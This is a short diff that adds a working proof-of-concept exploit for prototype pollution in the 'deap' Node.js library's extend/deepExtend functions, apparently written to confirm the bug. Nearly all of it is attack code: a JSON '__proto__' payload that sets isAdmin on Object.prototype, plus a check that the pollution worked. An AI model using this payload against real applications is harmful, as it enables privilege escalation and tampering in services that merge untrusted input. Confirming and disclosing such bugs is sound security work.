@@ -1,0 +1,24 @@
+Confirmed prototype pollution in `deap`'s `deepExtend`/`extend`.
+
+```javascript
+// Exploit: Prototype Pollution in `deap` (lib/deap.js -> deepExtend/extend)
+// deepExtend recurses into `a[p]`/`b[p]` via Object.keys(b) without filtering
+// "__proto__", so a JSON-derived payload can pollute Object.prototype.
+
+const deap = require("./node_modules/deap");
+
+console.log("before:", ({}).isAdmin); // undefined
+
+// Untrusted input, e.g. parsed from JSON (attacker-controlled request body)
+const malicious = JSON.parse('{"__proto__":{"isAdmin":true}}');
+
+// Merging attacker-controlled object into any plain object triggers pollution
+deap.extend({}, malicious);
+
+// Every object in the process is now polluted
+console.log("after:", ({}).isAdmin); // true
+if (({}).isAdmin !== true) {
+  throw new Error("Exploit failed");
+}
+console.log("Prototype pollution confirmed: Object.prototype.isAdmin =", ({}).isAdmin);
+```
